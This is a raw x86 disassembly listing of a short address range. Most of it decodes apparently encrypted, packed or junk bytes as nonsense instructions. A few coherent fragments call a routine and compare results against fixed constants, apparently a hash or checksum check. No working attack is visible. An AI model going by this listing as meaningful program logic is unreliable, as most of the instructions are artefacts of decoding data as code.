  41a948:	(bad)  
  41a949:	iret   
  41a94a:	aam    0x68
  41a94c:	adc    eax,0xd22fe59c
  41a951:	adc    BYTE PTR [edx+0x7dde9302],0x9b
  41a958:	mov    ds:0xc76d03f1,al
  41a95d:	lods   eax,DWORD PTR ds:[esi]
  41a95e:	mov    esi,0xb124c469
  41a963:	mov    ds:0x96c7fa91,al
  41a968:	aam    0x6b
  41a96a:	pusha  
  41a96b:	adc    al,0x72
  41a96d:	cmp    eax,0xbcbbfe6e
  41a972:	adc    bh,0x6
  41a975:	dec    esi
  41a976:	ds jl  0x41a9b2
  41a979:	call   0xf6f494e6
  41a97e:	int    0x16
  41a980:	mov    cl,0x78
  41a982:	mov    ds:0x7eb53864,eax
  41a987:	(bad)  
  41a988:	lods   al,BYTE PTR ds:[esi]
  41a989:	mov    WORD PTR [ecx+edi*8+0xcdc1cb4],ds
  41a990:	mov    BYTE PTR [ebx+eax*8-0x4033f7c0],dh
  41a997:	cdq    
  41a998:	pusha  
  41a999:	sahf   
  41a99a:	or     eax,ecx
  41a99c:	stos   BYTE PTR es:[edi],al
  41a99d:	(bad)  
  41a99e:	addr16 out 0xad,eax
  41a9a1:	or     ecx,ebp
  41a9a3:	cli    
  41a9a4:	or     eax,0x5ab1e046
  41a9a9:	cld    
  41a9aa:	test   eax,0x241ddfd9
  41a9af:	popf   
  41a9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9b1:	ins    DWORD PTR es:[edi],dx
  41a9b2:	jns    0x41a949
  41a9b4:	rcr    dh,cl
  41a9b6:	imul   ebx,DWORD PTR [eax-0x3143e34f],0x8465b5fa
  41a9c0:	sub    esi,DWORD PTR [edx-0x54]
  41a9c3:	add    al,0x1f
  41a9c5:	pop    ecx
  41a9c6:	(bad)
  41a9ca:	adc    BYTE PTR [ebx],dl
  41a9cc:	int3   
  41a9cd:	jns    0x41a98d
  41a9cf:	sbb    bl,cl
  41a9d1:	pushf  
  41a9d2:	ins    DWORD PTR es:[edi],dx
  41a9d3:	cmp    cl,ch
  41a9d5:	xor    eax,0xe26e458b
  41a9da:	push   ds
  41a9db:	lea    ebp,[eax+0x2226243e]
  41a9e1:	dec    eax
  41a9e2:	fidiv  WORD PTR [edi]
  41a9e4:	mov    esp,0x3124b01
  41a9e9:	fist   WORD PTR [ebx+ecx*8+0xf]
  41a9ed:	outs   dx,BYTE PTR ds:[esi]
  41a9ee:	popa   
  41a9ef:	cmc    
  41a9f0:	dec    esi
  41a9f1:	inc    eax
  41a9f2:	adc    eax,0xf653e659
  41a9f7:	jo     0x41aa10
  41a9f9:	mov    es,WORD PTR [esi-0x331870f0]
  41a9ff:	je     0x41a9bb
  41aa01:	cmpxchg DWORD PTR [ebp-0x72e072d0],edi
  41aa08:	mov    dl,0x9a
  41aa0a:	mov    DWORD PTR [edx],eax
  41aa0c:	and    BYTE PTR [ebx+0x5eb912d8],0x90
  41aa13:	xchg   ebp,eax
  41aa14:	daa    
  41aa15:	aam    0x3f
  41aa17:	mov    BYTE PTR [edx],ch
  41aa19:	je     0x41aa81
  41aa1b:	jmp    0x41a9ed
  41aa1d:	pusha  
  41aa1e:	je     0x41a9ed
  41aa20:	cmp    BYTE PTR [edi],bh
  41aa22:	(bad)  
  41aa23:	fistp  WORD PTR [ebx+0x518709e7]
  41aa29:	and    DWORD PTR [esi+0x72ee1533],0xfc362c08
  41aa33:	jb     0x41a9ca
  41aa35:	shl    BYTE PTR [ecx],1
  41aa37:	cld    
  41aa38:	cmp    eax,0xb2cfb922
  41aa3d:	sub    ecx,DWORD PTR ds:0x6a439e8a
  41aa43:	xor    DWORD PTR [ecx+0x10],ecx
  41aa46:	scas   eax,DWORD PTR es:[edi]
  41aa47:	(bad)  
  41aa48:	fsubr  QWORD PTR [ebp+0x35]
  41aa4b:	mov    bh,BYTE PTR ss:[eax+0x3369b7ce]
  41aa52:	aaa    
  41aa53:	xchg   DWORD PTR [esi],edi
  41aa55:	mov    ds:0xead6c53c,al
  41aa5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa5b:	pusha  
  41aa5c:	aad    0xc
  41aa5e:	aam    0x9c
  41aa60:	push   ss
  41aa61:	fs pop ebp
  41aa63:	out    dx,eax
  41aa64:	repz icebp 
  41aa66:	push   ebx
  41aa67:	mov    bl,0x5f
  41aa69:	fnstcw WORD PTR ds:0xc84479e0
  41aa6f:	jp     0x41aa71
  41aa71:	dec    eax
  41aa72:	mov    esp,0xd5c4b14b
  41aa77:	call   0x6388a8e2
  41aa7c:	mov    ecx,0x7caf85cd
  41aa81:	ja     0x41aae9
  41aa83:	mov    al,0xcb
  41aa85:	cmc    
  41aa86:	cs jmp 0x3f7:0x11d8f022
  41aa8e:	mov    eax,ds:0x94a20f3e
  41aa93:	outs   dx,BYTE PTR ds:[esi]
  41aa94:	stos   BYTE PTR es:[edi],al
  41aa95:	into   
  41aa96:	mov    al,0xa4
  41aa98:	js     0x41aae8
  41aa9a:	mov    ecx,0x79f5fe3a
  41aa9f:	inc    esi
  41aaa0:	mov    eax,ds:0xf2178e8b
  41aaa5:	inc    eax
  41aaa6:	lods   eax,DWORD PTR ds:[esi]
  41aaa7:	lock inc ebp
  41aaa9:	pop    esp
  41aaaa:	inc    edx
  41aaab:	jle    0x41ab1b
  41aaad:	call   0x26cc:0x9c9670e1
  41aab4:	pop    es
  41aab5:	outs   dx,BYTE PTR ds:[esi]
  41aab6:	sbb    eax,0xa4b56968
  41aabb:	in     al,dx
  41aabc:	mov    ch,0x4a
  41aabe:	dec    esp
  41aabf:	add    eax,0x4cb6a6b7
  41aac4:	dec    esp
  41aac5:	sbb    edx,DWORD PTR [esi+0x39]
  41aac8:	hlt    
  41aac9:	cli    
  41aaca:	popf   
  41aacb:	pop    ss
  41aacc:	fisub  WORD PTR [eax+0x71]
  41aacf:	inc    ebp
  41aad0:	mov    edx,0x89990ad2
  41aad5:	push   es
  41aad6:	stos   BYTE PTR es:[edi],al
  41aad7:	adc    eax,0xd4afdb2f
  41aadc:	inc    sp
  41aade:	push   esi
  41aadf:	aas    
  41aae0:	sti    
  41aae1:	loop   0x41aaa9
  41aae3:	sbb    edx,edx
  41aae5:	jle    0x41aae6
  41aae7:	pop    ebp
  41aae8:	xor    eax,0xa56ceeff
  41aaed:	sub    dh,dh
  41aaef:	loop   0x41ab5a
  41aaf1:	rcl    BYTE PTR [eax],cl
  41aaf3:	adc    BYTE PTR [edx+0x7a],dh
  41aaf6:	push   ecx
  41aaf7:	fld    QWORD PTR [esp-0x529ccbda]
  41aafe:	pushf  
  41aaff:	lds    eax,FWORD PTR [eax]
  41ab01:	mov    DWORD PTR [esi-0x74ac4a2e],esi
  41ab07:	pop    esp
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x42202c
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x42202c
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x7e0e18c7],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1-0x23f9e7e8],bh
  41ab67:	hlt    
  41ab68:	stc    
  41ab69:	div    DWORD PTR [eax+0x2f80f941]
  41ab6f:	test   eax,0x36513171
  41ab74:	push   0x849c3b55
  41ab79:	aas    
  41ab7a:	icebp  
  41ab7b:	jge    0x41ab67
  41ab7d:	or     bh,BYTE PTR ds:0xd4d538cb
  41ab83:	xchg   esi,eax
  41ab84:	icebp  
  41ab85:	int    0xf2
  41ab87:	push   cs
  41ab88:	and    al,0xf2
  41ab8a:	or     eax,0x9a0b883d
  41ab8f:	jb     0x41abe0
  41ab91:	ret    0x5a2a
  41ab94:	push   esp
  41ab95:	ins    BYTE PTR es:[edi],dx
  41ab96:	inc    ebx
  41ab97:	pop    edi
  41ab98:	sub    eax,0xbe84847e
  41ab9d:	shl    DWORD PTR [esi],1
  41ab9f:	fistp  DWORD PTR [eax+ebx*8]
  41aba2:	es xchg ebp,eax
  41aba4:	fnsave [edi+ebx*1-0x3e528abc]
  41abab:	sti    
  41abac:	(bad)  
  41abad:	sbb    eax,0x3a0678da
  41abb2:	das    
  41abb3:	nop
  41abb4:	adc    bl,bh
  41abb6:	sub    al,0xce
  41abb8:	sub    al,0xe3
  41abba:	cwde   
  41abbb:	scas   al,BYTE PTR es:[edi]
  41abbc:	sbb    dh,al
  41abbe:	and    BYTE PTR [edi+ebx*4],dl
  41abc1:	jp     0x41abd8
  41abc3:	jmp    0xd844e1ea
  41abc8:	call   0x98697a8
  41abcd:	shl    DWORD PTR [edx],0x72
  41abd0:	mov    BYTE PTR [ebx+edi*1],ch
  41abd3:	imul   dl
  41abd5:	mov    ah,0xf2
  41abd7:	push   ss
  41abd8:	xor    BYTE PTR [ebp+0xc],cl
  41abdb:	adc    BYTE PTR [edx+0x5efb8d18],ch
  41abe1:	and    edx,edx
  41abe3:	push   edi
  41abe4:	push   es
  41abe5:	or     al,0xe4
  41abe7:	test   al,0x10
  41abe9:	fstp   TBYTE PTR [ebp+0x7e]
  41abec:	inc    ecx
  41abed:	mov    dh,0x4a
  41abef:	pop    edi
  41abf0:	(bad)  
  41abf1:	sbb    ah,BYTE PTR [ebx-0x7ff0ca09]
  41abf7:	int3   
  41abf8:	pop    ecx
  41abf9:	pop    esp
  41abfa:	mov    cl,0x81
  41abfc:	ss ss ins DWORD PTR es:[edi],dx
  41abff:	xor    DWORD PTR [edi],0xffffffdc
  41ac02:	push   fs
  41ac04:	push   ebp
  41ac05:	out    dx,al
  41ac06:	data16 mov al,0xf9
  41ac09:	push   cs
  41ac0a:	mov    bl,0x88
  41ac0c:	cmp    bh,BYTE PTR [esi]
  41ac0e:	pop    edi
  41ac0f:	(bad)  
  41ac10:	imul   eax,DWORD PTR [edi],0x38d45f5c
  41ac16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac17:	cmp    al,0x5a
  41ac19:	in     eax,dx
  41ac1a:	xchg   edx,eax
  41ac1b:	out    dx,al
  41ac1c:	int3   
  41ac1d:	imul   esi,DWORD PTR [eax-0x3da36b75],0xffffffdb
  41ac24:	push   ebx
  41ac25:	cs add al,0xc9
  41ac28:	jmp    0xfe142a2a
  41ac2d:	shl    BYTE PTR ds:0xbdf70ba5,0xf1
  41ac34:	sub    al,0x94
  41ac36:	sbb    DWORD PTR [ecx+eiz*8],0xe819e575
  41ac3d:	fcom   DWORD PTR ds:[edx-0x52b6a415]
  41ac44:	and    al,0x39
  41ac46:	call   0x8ead3e69
  41ac4b:	mov    al,0x4d
  41ac4d:	dec    esi
  41ac4e:	ror    BYTE PTR [edx+0x1c],cl
  41ac51:	pop    edx
  41ac52:	out    0xe,al
  41ac54:	leave  
  41ac55:	or     BYTE PTR [esi],0xa7
  41ac58:	das    
  41ac59:	test   BYTE PTR es:[edi-0x31b1f1e9],ah
  41ac60:	jmp    FWORD PTR [esi]
  41ac62:	aas    
  41ac63:	pop    esp
  41ac64:	sub    ah,al
  41ac66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac67:	out    dx,eax
  41ac68:	mov    ds:0x9294fa4e,eax
  41ac6d:	fwait
  41ac6e:	pop    esi
  41ac6f:	aaa    
  41ac70:	iret   
  41ac71:	fcomp  DWORD PTR ds:0xc20e96a0
  41ac77:	cli    
  41ac78:	das    
  41ac79:	retf   0x3420
  41ac7c:	test   al,0xb3
  41ac7e:	call   0x74a0eb00
  41ac83:	shr    DWORD PTR [ebp+0x48],1
  41ac86:	lahf   
  41ac87:	dec    edx
  41ac88:	repnz idiv edx
  41ac8b:	jb     0x41ac0e
  41ac8d:	adc    al,0x96
  41ac8f:	push   ds
  41ac90:	loopne 0x41ad0f
  41ac92:	xor    ah,dl
  41ac94:	or     dh,BYTE PTR [eax-0x2319a278]
  41ac9a:	ins    BYTE PTR es:[edi],dx
  41ac9b:	xor    dl,bl
  41ac9d:	xor    al,0x37
  41ac9f:	mov    BYTE PTR [eax-0x44],ch
  41aca2:	les    esi,FWORD PTR [edx]
  41aca4:	fwait
  41aca5:	ds jbe 0x41ac81
  41aca8:	test   BYTE PTR [ecx-0x1baf712e],al
  41acae:	mov    eax,eax
  41acb0:	inc    ecx
  41acb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb2:	push   ecx
  41acb3:	cmp    al,BYTE PTR [ebx-0x10]
  41acb6:	mov    al,BYTE PTR [edx-0x551995db]
  41acbc:	out    dx,al
  41acbd:	sub    BYTE PTR [esi],ch
  41acbf:	cmp    eax,0x4f5a4356
  41acc4:	sub    al,0x52
  41acc6:	or     ebx,ebp
  41acc8:	ss jmp 0x8da7ea2e
  41acce:	inc    ecx
  41accf:	in     eax,0x3
  41acd1:	cmp    al,0xf5
  41acd3:	and    eax,0x201cd651
  41acd8:	or     esp,DWORD PTR [esi-0x1a]
  41acdb:	or     bh,BYTE PTR [ecx+0x7b]
  41acde:	dec    ecx
  41acdf:	xor    BYTE PTR [di+0x12],bl
  41ace3:	pop    esi
  41ace4:	scas   eax,DWORD PTR es:[edi]
  41ace5:	pop    ss
  41ace6:	pop    es
  41ace7:	mov    cl,0x95
  41ace9:	pop    ss
  41acea:	sbb    esp,DWORD PTR [edx]
  41acec:	inc    DWORD PTR [eax-0x78ebab37]
  41acf2:	xchg   BYTE PTR [eax+0xb8d977d],ch
  41acf8:	lock loopne 0x41ad3a
  41acfb:	jne    0x41ad2a
  41acfd:	add    al,0x5e
  41acff:	and    bh,ah
  41ad01:	jl     0x41acb8
  41ad03:	xchg   BYTE PTR [ebp+eax*8+0x323368d7],bl
  41ad0a:	rcl    edx,cl
  41ad0c:	shl    BYTE PTR [ecx+eiz*1-0x31186037],1
  41ad13:	push   0xa5ad48c9
  41ad18:	xlat   BYTE PTR ds:[ebx]
  41ad19:	sbb    ebx,DWORD PTR [eax-0x50642dd9]
  41ad1f:	ja     0x41ad99
  41ad21:	jo     0x41ad9f
  41ad23:	(bad)
  41ad26:	or     BYTE PTR [ecx],0x18
  41ad29:	xor    dh,cl
  41ad2b:	sub    edx,DWORD PTR [edi+ecx*4+0x2323352a]
  41ad32:	fsubr  DWORD PTR [esi+0x56]
  41ad35:	push   ebx
  41ad36:	add    eax,0x7cdad27c
  41ad3b:	data16 jnp 0x41ad7b
  41ad3e:	(bad)  
  41ad3f:	xchg   ecx,eax
  41ad40:	mov    ah,0x60
  41ad42:	in     al,dx
  41ad43:	jle    0x41acff
  41ad45:	push   ecx
  41ad46:	dec    esp
  41ad47:	leave  
  41ad48:	ret    0xc29b
  41ad4b:	call   0xf0929bcc
  41ad50:	sbb    esp,eax
  41ad52:	xchg   ebp,eax
  41ad53:	jo     0x41adb7
  41ad55:	retf   
  41ad56:	or     dl,al
  41ad58:	jg     0x41ad0b
  41ad5a:	(bad)  
  41ad5b:	adc    edi,esi
  41ad5d:	dec    ecx
  41ad5e:	xchg   edi,eax
  41ad5f:	je     0x41adbb
  41ad61:	xchg   BYTE PTR [edx],cl
  41ad63:	sahf   
  41ad64:	mov    ds:0xef7e0b47,al
  41ad69:	lods   eax,DWORD PTR ds:[esi]
  41ad6a:	jle    0x41acf9
  41ad6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad6d:	shl    BYTE PTR [edi+0x55],0x77
  41ad71:	(bad)  
  41ad72:	fmul   DWORD PTR [ecx]
  41ad74:	inc    ecx
  41ad75:	test   al,0xcf
  41ad77:	call   0x316f:0x5f471f36
  41ad7e:	cmp    eax,0xcb4c8dbe
  41ad83:	shr    DWORD PTR [edi+edx*2-0x5861cb55],cl
  41ad8a:	mov    ds:0x8b04dc0f,eax
  41ad8f:	and    BYTE PTR [ebp-0x61bfbe4e],0x25
  41ad96:	pop    esp
  41ad97:	jmp    0x76f5eea8
  41ad9c:	arpl   WORD PTR [bp+si-0xc],bx
  41ada0:	mov    bh,BYTE PTR es:[edx+0xf]
  41ada4:	push   ebx
  41ada5:	mov    ch,0xf6
  41ada7:	sub    DWORD PTR [esi+0x22],ecx
  41adaa:	mov    ds:0xf424b94a,al
  41adaf:	icebp  
  41adb0:	dec    ebp
  41adb1:	jnp    0x41ae23
  41adb3:	arpl   WORD PTR [ebp-0x47],ax
  41adb6:	enter  0xc683,0x90
  41adba:	inc    ebx
  41adbb:	lahf   
  41adbc:	mov    eax,ds:0x9a5cc14
  41adc1:	ja     0x41ae39
  41adc3:	jmp    0x41add7
  41adc5:	sub    DWORD PTR [esi+0x4444421a],0xdffd8c55
  41adcf:	or     DWORD PTR [ebx+0xdba3ce0],esp
  41add5:	mov    bl,0x58
  41add7:	scas   eax,DWORD PTR es:[edi]
  41add8:	call   0x14d9:0x890d1811
  41addf:	into   
  41ade0:	add    ch,dh
  41ade2:	inc    esp
  41ade3:	lock retf 
  41ade5:	les    esi,FWORD PTR [eax]
  41ade7:	sbb    bh,ah
  41ade9:	outs   dx,DWORD PTR ds:[esi]
  41adea:	xchg   ecx,eax
  41adeb:	push   0xfbc4b057
  41adf0:	jp     0x41adda
  41adf2:	imul   ecx,DWORD PTR [edi],0xa
  41adf5:	push   ebp
  41adf6:	or     DWORD PTR [ebx+0x55],ebp
  41adf9:	mov    DWORD PTR [esi-0x46c04e97],edi
  41adff:	loopne 0x41ae07
  41ae01:	mov    cl,0x2d
  41ae03:	rol    DWORD PTR [ecx-0x2b],cl
  41ae06:	jb     0x41ae3f
  41ae08:	fdiv   QWORD PTR [esi-0x3a0f507a]
  41ae0e:	sub    DWORD PTR [esi],0xe64e472c
  41ae14:	jmp    0x2888:0xf6ca6e79
  41ae1b:	xor    bh,BYTE PTR [eax]
  41ae1d:	or     ebx,esi
  41ae1f:	inc    edx
  41ae20:	add    DWORD PTR [esi],esi
  41ae22:	add    DWORD PTR [edx],esp
  41ae24:	mov    eax,DWORD PTR [edx+0x15e3b070]
  41ae2a:	rcr    DWORD PTR [esi],1
  41ae2c:	stos   BYTE PTR es:[edi],al
  41ae2d:	fimul  WORD PTR [eax-0x50]
  41ae30:	and    BYTE PTR [edx],bl
  41ae32:	popa   
  41ae33:	lea    edx,[edi]
  41ae35:	mov    ch,dh
  41ae37:	fcomi  st,st(7)
  41ae39:	mov    dh,0x2c
  41ae3b:	retf   0xf832
  41ae3e:	popf   
  41ae3f:	popa   
  41ae40:	push   0xffffff9b
  41ae42:	or     edx,ebp
  41ae44:	push   esp
  41ae45:	lods   al,BYTE PTR ds:[esi]
  41ae46:	mov    al,0x8e
  41ae48:	mov    DWORD PTR [edx+0xc493f7b],edi
  41ae4e:	in     al,dx
  41ae4f:	inc    eax
  41ae50:	jl     0x41ae30
  41ae52:	enter  0xfaa6,0x5f
  41ae56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae57:	mov    eax,0xe7b50aeb
  41ae5c:	sub    edx,esi
  41ae5e:	and    BYTE PTR [edx],ah
  41ae60:	enter  0x18d4,0x95
  41ae64:	jle    0x41aec2
  41ae66:	xchg   esi,eax
  41ae67:	dec    esi
  41ae68:	sbb    eax,0x9a05d97f
  41ae6d:	sub    ch,al
  41ae6f:	neg    BYTE PTR [edx+edi*8-0x2b210d6f]
  41ae76:	push   esp
  41ae77:	enter  0xae95,0xc1
  41ae7b:	dec    edx
  41ae7c:	push   0x76e4e1fe
  41ae81:	adc    edi,DWORD PTR [esi-0x65]
  41ae84:	arpl   ax,bp
  41ae86:	sbb    DWORD PTR [ebx-0x20941aad],edx
  41ae8c:	rol    al,1
  41ae8e:	popa   
  41ae8f:	xor    BYTE PTR [ebp-0x2eb5b011],0x24
  41ae96:	mov    bl,BYTE PTR [ebx+0x5c]
  41ae99:	inc    edx
  41ae9a:	add    BYTE PTR [edx+edx*1-0x1fc26837],dh
  41aea1:	xchg   esi,eax
  41aea2:	pop    edi
  41aea3:	jno    0x41ae4c
  41aea5:	popa   
  41aea6:	dec    edx
  41aea7:	pop    edx
  41aea8:	mov    bl,0xa7
  41aeaa:	jg     0x41aee6
  41aeac:	and    edi,edi
  41aeae:	fsubr  DWORD PTR [ecx]
  41aeb0:	std    
  41aeb1:	jmp    0x41aebd
  41aeb3:	ret    
  41aeb4:	(bad)  
  41aeb5:	jecxz  0x41af22
  41aeb7:	push   ebp
  41aeb8:	and    BYTE PTR [ebp-0x23],cl
  41aebb:	imul   DWORD PTR ds:0x66dddf4a
  41aec1:	dec    edi
  41aec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec3:	int    0xba
  41aec5:	int3   
  41aec6:	sbb    eax,0x50f40cf4
  41aecb:	jle    0x41af18
  41aecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aece:	or     DWORD PTR es:[edi+0x34],eax
  41aed2:	ret    0x1ac2
  41aed5:	xlat   BYTE PTR ds:[ebx]
  41aed6:	sub    BYTE PTR [edx+0x6d],dh
  41aed9:	mov    esp,0x7ad5f9eb
  41aede:	call   0xe6382792
  41aee3:	or     esi,DWORD PTR [ecx+ebp*2+0x7e]
  41aee7:	adc    eax,0x6439971d
  41aeec:	mov    esi,0xfafb0e90
  41aef1:	out    dx,al
  41aef2:	out    dx,al
  41aef3:	dec    edi
  41aef4:	loope  0x41aedf
  41aef6:	test   dl,dl
  41aef8:	xor    eax,0x6aa8f68
  41aefd:	loop   0x41af2a
  41aeff:	test   BYTE PTR [esi+edi*2],ah
  41af02:	pop    ds
  41af03:	lahf   
  41af04:	sbb    BYTE PTR ds:0x547a1930,0x1f
  41af0b:	push   edi
  41af0c:	mov    eax,?
  41af0e:	icebp  
  41af0f:	push   0x51c3bcf6
  41af14:	mov    ecx,0x840fe70f
  41af19:	add    al,0x2a
  41af1b:	add    BYTE PTR [eax],al
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af86
  41af80:	push   esi
  41af81:	inc    edi
  41af82:	push   0x17
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1-0x1af8e7e8],bh
  41af8d:	(bad)  
  41af8e:	es iret 
  41af90:	scas   eax,DWORD PTR es:[edi]
  41af91:	hlt    
  41af92:	sbb    esp,DWORD PTR [edx+ecx*1-0x14]
  41af96:	fwait
  41af97:	mov    edx,0xe5cfd597
  41af9c:	pop    esp
  41af9d:	ret    0xf865
  41afa0:	mov    cl,0x6b
  41afa2:	sub    ebp,DWORD PTR [edi+0x57]
  41afa5:	pop    ecx
  41afa6:	xor    al,0xbb
  41afa8:	and    eax,0xff93efca
  41afad:	ss dec ebp
  41afaf:	sub    DWORD PTR [ebx],ecx
  41afb1:	cmp    ecx,DWORD PTR [edx]
  41afb3:	pop    edi
  41afb4:	sbb    dl,BYTE PTR [ebp+0x3]
  41afb7:	add    ebx,DWORD PTR [eax+0x12]
  41afba:	or     eax,0x493f38e6
  41afbf:	or     DWORD PTR [esi],eax
  41afc1:	in     al,0xb5
  41afc3:	sbb    esi,DWORD PTR [edi+0x2356754d]
  41afc9:	dec    ecx
  41afca:	leave  
  41afcb:	push   DWORD PTR [edi]
  41afcd:	pop    es
  41afce:	out    dx,eax
  41afcf:	lahf   
  41afd0:	retf   
  41afd1:	popa   
  41afd2:	ficomp DWORD PTR [edx]
  41afd4:	fldenv ds:0x3874a76e
  41afda:	cdq    
  41afdb:	adc    ch,al
  41afdd:	dec    DWORD PTR [edx-0x469233b1]
  41afe3:	in     al,dx
  41afe4:	jl     0x41afa4
  41afe6:	xor    al,0x62
  41afe8:	push   esi
  41afe9:	fdiv   QWORD PTR [ecx+0x421c5076]
  41afef:	xchg   esi,eax
  41aff0:	inc    edx
  41aff1:	push   ecx
  41aff2:	fwait
  41aff3:	mov    ebp,0x9359cadc
  41aff8:	inc    esi
  41affa:	jno    0x41afa5
  41affc:	ror    DWORD PTR [esi-0x4],1
  41afff:	mov    WORD PTR [esp+eax*2],ds
  41b002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b003:	xchg   esp,eax
  41b004:	adc    al,0x44
  41b006:	lea    esi,[ebp+eiz*8+0x3]
  41b00a:	xchg   ecx,eax
  41b00b:	pop    ss
  41b00c:	xchg   esi,eax
  41b00d:	into   
  41b00e:	add    BYTE PTR [ebx],0x37
  41b011:	mov    dh,0x93
  41b013:	(bad)  
  41b014:	jle    0x41b04b
  41b016:	push   ss
  41b017:	adc    ah,BYTE PTR [ebx-0x4d]
  41b01a:	ins    DWORD PTR es:[edi],dx
  41b01b:	xor    DWORD PTR [edi+0x41],0x68
  41b01f:	cmp    eax,0xfcef204f
  41b024:	fldcw  WORD PTR [esi+0x70b508ea]
  41b02a:	fucomp st(0)
  41b02c:	and    BYTE PTR [edi],cl
  41b02e:	lea    edx,[ebx]
  41b030:	jne    0x41b082
  41b032:	sub    al,0x73
  41b034:	test   DWORD PTR [eax-0x7],edi
  41b037:	(bad)  
  41b039:	add    eax,0x3310b16
  41b03e:	jl     0x41b0a0
  41b040:	(bad)  
  41b041:	xchg   ebp,eax
  41b042:	and    eax,0xcd155202
  41b047:	sub    al,0x73
  41b049:	ins    DWORD PTR es:[edi],dx
  41b04a:	xor    al,0x9b
  41b04c:	pop    eax
  41b04d:	ja     0x41b0aa
  41b04f:	ret    0x8972
  41b052:	fistp  DWORD PTR [ebx+0x42]
  41b055:	jns    0x41b05b
  41b057:	jl     0x41b0bd
  41b059:	hlt    
  41b05a:	dec    eax
  41b05b:	mov    ebp,0x95bcc5fa
  41b060:	(bad)  
  41b061:	dec    esi
  41b062:	mov    ch,0x69
  41b064:	ss add al,0x9a
  41b067:	xor    edx,DWORD PTR [ebp-0x54]
  41b06a:	scas   eax,DWORD PTR es:[edi]
  41b06b:	jl     0x41b0e6
  41b06d:	or     DWORD PTR [ebx+0x44f39f8e],0x9fea9ce4
  41b077:	stc    
  41b078:	cmp    al,0x9f
  41b07a:	int3   
  41b07b:	sbb    DWORD PTR [ecx-0x60],edi
  41b07e:	aam    0xbc
  41b080:	cmp    al,0x1f
  41b082:	arpl   WORD PTR [esi+edx*8+0x4e],sp
  41b086:	sbb    BYTE PTR ds:0x1fd9bfb3,bh
  41b08c:	xchg   edx,eax
  41b08d:	push   ebp
  41b08e:	popf   
  41b08f:	dec    edi
  41b090:	es jno 0x41b077
  41b093:	and    bl,al
  41b095:	dec    edx
  41b096:	fucomp st(1)
  41b098:	adc    BYTE PTR [edi],bh
  41b09a:	xchg   ecx,eax
  41b09b:	dec    esp
  41b09c:	add    al,0x47
  41b09e:	xor    eax,0x808034d2
  41b0a3:	pushf  
  41b0a4:	jnp    0x41b056
  41b0a6:	or     DWORD PTR [edx],esi
  41b0a8:	mov    edi,0x3bd0e034
  41b0ad:	test   eax,0x4f108044
  41b0b2:	inc    esp
  41b0b3:	inc    ebx
  41b0b4:	xchg   ebp,eax
  41b0b5:	xchg   ebx,eax
  41b0b6:	mov    al,ds:0xdc56f738
  41b0bb:	cmp    eax,ecx
  41b0bd:	cwde   
  41b0be:	sbb    al,0x94
  41b0c0:	pop    es
  41b0c1:	outs   dx,DWORD PTR cs:[esi]
  41b0c3:	mov    ebp,0xb16995c9
  41b0c8:	inc    ebp
  41b0c9:	pop    esp
  41b0ca:	lea    ebx,[esi-0x28]
  41b0cd:	loope  0x41b0a5
  41b0cf:	jecxz  0x41b0a5
  41b0d1:	cmc    
  41b0d2:	mov    ds:0xf4d39b32,al
  41b0d7:	cmp    al,BYTE PTR [edx+0x1a7011c8]
  41b0dd:	cmp    al,0xa2
  41b0df:	mov    ecx,0x2df2e991
  41b0e4:	int    0xc3
  41b0e6:	jmp    0x41b0b7
  41b0e8:	mov    ch,0x96
  41b0ea:	ja     0x41b14f
